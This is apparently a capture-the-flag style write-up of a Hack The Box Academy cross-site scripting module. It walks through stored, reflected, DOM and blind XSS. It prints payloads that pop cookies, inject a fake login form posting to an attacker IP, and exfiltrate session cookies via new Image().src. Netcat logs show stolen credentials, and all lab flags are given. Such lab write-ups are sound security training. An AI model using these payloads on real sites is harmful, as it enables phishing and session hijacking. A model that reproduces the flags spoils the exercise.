# Cross-Site Scripting (XSS)
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Cross-Site Scripting (XSS)
* Tier: II
* Difficulty: Easy
* Category: Offensive
* Time estimate: 6 hours
* Date: 10-05-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Stored XSS
### Question:
![](./attachments/Pasted%20image%2020220510163725.png)

*Hint: document.cookie*

We need to get our cookie by XXS injection. This can be done with an alert.

```html
<script>alert(document.cookie)</script>
```

![](./attachments/Pasted%20image%2020220510164130.png)

**Answer:** `HTB{570r3d_f0r_3v3ry0n3_70_533}`

---
## Reflected XSS
### Question:
![](./attachments/Pasted%20image%2020220510164809.png)

*Hint: document.cookie*

Solution is the same as the above 

**Answer:** `HTB{r3fl3c73d_b4ck_2_m3}`

---
## DOM XSS
### Question:
![](./attachments/Pasted%20image%2020220510165224.png)

*Hint: document.cookie*

This time, we can use an HTMP `<img>` tag to generate an alert.

```html
<img src="" onerror=alert(document.cookie)>
```

![](./attachments/Pasted%20image%2020220510170641.png)

**Answer:** `HTB{pur3ly_cl13n7_51d3}`

---
## XSS Discovery
### Question 1:
![](./attachments/Pasted%20image%2020220510170930.png)

*Hint: Try to manipulate URL parameters after a successful submission*

We will use XSS Strike to scan for vulnerabilities:

```
┌──(kali㉿kali)-[~/XSStrike]
└─$ python xsstrike.py -u "http://157.245.33.77:32431/?fullname=g&username=g&password=g&email=g%40g.com"

        XSStrike v3.1.5

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: fullname 
[-] No reflection found 
[!] Testing parameter: username 
[-] No reflection found 
[!] Testing parameter: password 
[-] No reflection found 
[!] Testing parameter: email 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl/+/ONPOInterEnter+=+(confirm)()%0dx> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] y
```

Payload found: `<HtMl/+/ONPOInterEnter+=+(confirm)()%0dx>`

We can find out what field is vulnerable by appending the payload to the input in each field until we get something.

When appended to the email in the email field, we get a reflection of our input.

Payload: `a@a.com<HtMl/+/ONPOInterEnter+=+(confirm)()%0dx>`

![](./attachments/Pasted%20image%2020220510174429.png)

**Answer:** `email`

### Question 2:
![](./attachments/Pasted%20image%2020220510170955.png)

*Hint: Is it persistent? Did it use an HTTP request?*


Since we can see the email we submitted, this is a reflected XSS.

**Answer:** `Reflected`

---
## Phishing
### Question:
![](./attachments/Pasted%20image%2020220510181152.png)

*Hint: Be sure to visit the URL and attempt to login to ensure everything works before sending the URL to the victim*

The page is reflecting the input in an HTTP `<img>` tag.

![](./attachments/Pasted%20image%2020220510221609.png)

Also, the payload is directly reflected in the URL.

![](./attachments/Pasted%20image%2020220510222620.png)

This means that this site is vulnerable to a reflected XSS vulnerability that can be leveraged for a phishing attack.

We can use the following payload to lave the `<img>` tag empty and close it gracefully, preventing any artifacts being displayed on the page.

Payload: `'>Haxx<div style="display:none'`

![](./attachments/Pasted%20image%2020220510222009.png)

Now that we can seamlessly display stuff on the page, we can make a malicious login form.

Payload:

```
'><h3>Please login to continue</h3><form action=http://10.10.15.133><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form><div style="display:none'
```

Webpage:

![](./attachments/Pasted%20image%2020220510223856.png)

To make the page look more convincing and nudge people to use the login form, we need to hide the image input field. This can do this by adding some JavaScript to our payload.

```
'><script>document.getElementById('urlform').remove();</script><h3>Please login to continue</h3><form action=http://10.10.15.133><input type="username" name="username" placeholder="Username">   <input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form><div style="display:none'
```

Finally, instead of just hiding the image tag, we might as well display a nice, professionally looking image.

```
https://freeiconshop.com/wp-content/uploads/edd/image-outline-filled.png' style="margin: -50px 0px -30px 0px;"><script>document.getElementById('urlform').remove();</script><h3>Please login to continue</h3><form action=http://10.10.15.133><input type="username" name="username" placeholder="Username">   <input type="password" name="password" placeholder="Password">   <input type="submit" name="submit" value="Login"></form><div style="display:none'
```

The final result.

![](./attachments/Pasted%20image%2020220510234036.png)

Now that the payload is done, we can start a netcat listener.

```bash
┌──(kali㉿kali)-[~/flybook]
└─$ nc -lvnp 80                       
listening on [any] 80 ...
▇
```

Lastly, all we need to do is send the link containing the payload to a victim and wait for it to be clicked.

Victim: `http://10.129.100.203/phishing/send.php`

```
http://10.129.100.203/phishing/index.php?url=https://freeiconshop.com/wp-content/uploads/edd/image-outline-filled.png%27%20style=%22margin:%20-50px%200px%20-30px%200px;%22%3E%3Cscript%3Edocument.getElementById(%27urlform%27).remove();%3C/script%3E%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.15.133%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%20%20%20%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%20%20%20%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%3Cdiv%20style=%22display:none%27
```

The victim tried to login and netcat received the request.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 80                       
listening on [any] 80 ...
connect to [10.10.15.133] from (UNKNOWN) [10.129.100.203] 39134
GET /?username=admin&password=p1zd0nt57341myp455&submit=Login HTTP/1.1
Host: 10.10.15.133
(...)
```

User:pass `admin:p1zd0nt57341myp455`

Now, we can login via the admin login portal at `/phishing/login.php`.

![](./attachments/Pasted%20image%2020220511000333.png)

**Answer:** `HTB{r3f13c73d_cr3d5_84ck_2_m3}`

---
## Session Hijacking
### Question 1:
![](./attachments/Pasted%20image%2020220511001659.png)

*Hint: Don't forget to set both the name/value of the cookie when using it.*

The page.

![](./attachments/Pasted%20image%2020220511005044.png)

Since the input is not reflected back, we can try to set up a netcat listener and make a payload that calls home. 

Various blind XSS payloads can be found at [PayloadsAllTheThings: XSS Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss).

Payload, name: `Hax Haxx"><script src="http://10.10.15.133/fullname"></script>`

Payload, username: `Haxx"><script src="http://10.10.15.133/username"></script>`

Payload, URL: `haxx"><script src="http://10.10.15.133/URL"></script>`

![](./attachments/Pasted%20image%2020220514165453.png)

We received a request from the web server asking for `/URL`, this means that the `Profile picture URL` field is vulnerable to XSS attacks.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 80                     
listening on [any] 80 ...
connect to [10.10.15.133] from (UNKNOWN) [10.129.103.213] 47276
GET /URL HTTP/1.1
Host: 10.10.15.133
(...)
```

Now we can hijack the cookie with the following payload.

Payload: `haxx"><script>new Image().src='http://10.10.15.133/index.php?c='+document.cookie</script>`

Once again we receive a request, this time containing the hijacked cookie.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.15.133] from (UNKNOWN) [10.129.103.226] 52312
GET /index.php?c=cookie=c00k1355h0u1d8353cu23d HTTP/1.1
Host: 10.10.15.133
(...)
```

Now we just need to go to the admin panel, create a new cookie, and insert the values.

![](./attachments/Pasted%20image%2020220514173023.png)

And hit refresh.

![](./attachments/Pasted%20image%2020220514173048.png)

**Answer:** `HTB{4lw4y5_53cur3_y0ur_c00k135}`

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220511002351.png)

*Hint: You can't see me, but i can see you!*

The page.

We need to find the vulnerable field.

Like in the previous question, we will set up a netcat listener and insert payloads into all the fields we want to test for vulnerability.

Payload, web: `Haxx><script src="http://10.10.15.133/web"></script>` 

![](./attachments/Pasted%20image%2020220514180441.png)

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.15.133] from (UNKNOWN) [10.129.103.240] 56256
GET /web HTTP/1.1
Host: 10.10.15.133
(...)
```

The web field is vulnerable.

We can store a malicious payload on the page in the form of a blog post, whenever someone visits the page, their browser will execute the payload and send us their cookie.

We will grab almost the same payload as in the previous question.

Payload: `hax><script>new Image().src='http://10.10.15.133/index.php?c='+document.cookie</script>`

Then, set up an HTTP server with Python, so we can catch the victim's cookie when the page is visited.

```bash
┌──(kali㉿kali)-[~/tmp]
└─$ sudo python3 -m http.server 80                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.100.111 - - [14/May/2022 15:48:26] "GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1652557705;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4} HTTP/1.1" 404 -
10.129.100.111 - - [14/May/2022 15:48:26] code 404, message File not found

```

We got the cookie!

**Answer:** `HTB{cr055_5173_5cr1p71n6_n1nj4}`

---

**Tags:** [[Hack The Box Academy]]